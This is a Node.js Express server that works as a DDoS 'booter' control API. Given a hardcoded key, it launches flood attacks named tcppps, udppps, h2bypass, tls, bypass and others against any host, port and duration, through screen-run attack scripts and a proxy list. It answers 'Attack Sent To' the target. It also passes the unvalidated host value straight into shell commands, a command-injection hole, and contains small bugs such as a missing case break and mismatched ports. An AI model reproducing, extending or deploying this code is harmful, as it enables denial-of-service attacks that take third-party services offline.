const express = require("express")
const { exec } = require("child_process")
const os = require("os")
const app = express()
function getServerIP() {
  const networkInterfaces = os.networkInterfaces()
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName]
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        return iface.address
      }
    }
  }
  return "0.0.0.0"
}
const serverIP = getServerIP()
function validateInput(input) {
  const safePattern = /^[a-zA-Z0-9._-]+$/
  return safePattern.test(input)
}
app.use((req, res, next) => {
  res.setHeader("Content-Type", "application/json")
  next()
})
app.use((req, res, next) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress
  console.log(`[${new Date().toISOString()}] Request from ${ip}: ${req.url}`)
  next()
})
app.get("/update", (req, res) => {
  const command = `cd /root/methods/ && screen -dm node proxy_scrapper.js`
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Update error: ${error}`)
      return res.status(500).json({
        success: false,
        message: "Error executing update command",
      })
    }
    console.log("Update command executed successfully")
    res.json({
      success: true,
      message: "Update process started successfully",
      timestamp: new Date().toISOString(),
    })
  })
})
app.get("/refresh", (req, res) => {
    const command = `pkill screen || true`
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`refres error: ${error}`)
        return res.status(500).json({
          success: false,
          message: "Error executing refresh command",
        })
      }
      console.log("refresh command executed successfully")
      res.json({
        success: true,
        message: "refresh process started successfully",
        timestamp: new Date().toISOString(),
      })
    })
  })
app.get("/", (req, res) => {
  const { host, port, time, method, key } = req.query
  if (!host || !port || !time || !method || !key) {
    return res.status(400).json({
      success: false,
      message: `Missing required parameters. Usage: http://${req.hostname}/?host=&port=&time=&method=&key=`,
    })
  }
  const allowedKeys = ["JLG"]
  if (!allowedKeys.includes(key)) {
    return res.status(403).json({
      success: false,
      message: "Invalid Key",
    })
  }
  if (!validateInput(port) || !validateInput(time) || !validateInput(method)) {
    return res.status(400).json({
      success: false,
      message: "Invalid input parameters",
    })
  }
  const timeValue = Number.parseInt(time, 10)
  if (isNaN(timeValue) || timeValue <= 0 || timeValue > 999999999999) {
    return res.status(400).json({
      success: false,
      message: "Invalid time parameter. Must be between 1-999999999999 seconds.",
    })
  }
  let command
  switch (method) {
    case "tcppps":
      command = `cd methods/ && screen -dm timeout ${time} ./tcp ${host} ${port} 2 99999999`
      break
     case "udppps":
      command = `cd methods/ && screen -dm ./udppps ${host} ${port} 3 99999999 ${time}` 
     case "h2-jlg":
      command = `cd methods/ && screen -dm node h2-jlg.js GET ${host} ${time} 2 8 indo.txt --full`
      break
      case "h2bypass":
      command = `cd methods/ && screen -dm node h2bypass.js GET ${host} ${time} 2 8 indo.txt --debug --full --referer %RAND%`
      break
     case "tls":
      command = `cd methods/ && screen -dm node tls.js GET ${host} indo.txt ${time} 8 2`
      break
     case "tlsv2":
      command = `cd methods/ && screen -dm node tlsv2.js ${host} ${time} 8 2 indo.txt`
      break
     case "bypass":
      command = `cd methods/ && screen -dm node bypass.js GET ${host} ${time} 2 8 indo.txt --query 1 --delay 1 --bfm true --referer rand`
      break
     case "browser":
      command = `cd methods/ && screen -dm python3 browser.py ${host} ${time}`
      break
    case "refresh":
      command = `cd methods/ && pkill screen`
      break
    case "update":
      command = `cd /root/methods/ && screen -dm node proxy_scrapper.js`
      break
    default:
      return res.status(400).json({
        success: false,
        message: "Unknown method",
      })
  }
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Execution error: ${error}`)
      return res.status(500).json({
        success: false,
        message: "Error executing command",
      })
    }
    console.log(`Command executed for ${method} attack on ${host}`)
    res.json({
      success: true,
      message: `Attack Sent To ${host} using ${method} Methods`,
      data: {
        host: host,
        port: port,
        time: time,
        method: method,
        timestamp: new Date().toISOString(),
      },
    })
  })
})
app.get("/status", (req, res) => {
  res.json({
    success: true,
    status: "online",
    timestamp: new Date().toISOString(),
  })
})
app.get("/methods", (req, res) => {
  const methods = [
    "tcppps",
    "udppps",
    "h2-jlg",
    "h2bypass",
    "tls",
    "tlsv2",
    "bypass",
    "browser",
    "refresh",
    "update",
  ]
  res.json({
    success: true,
    methods: methods,
  })
})
app.use((err, req, res, next) => {
  console.error(err.stack)
  res.status(500).json({
    success: false,
    message: "Something went wrong!",
  })
})
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: "Endpoint not found",
  })
})
app.listen(1337, serverIP, () => {
  console.log(`API Start In http://${serverIP}:7777`)
})
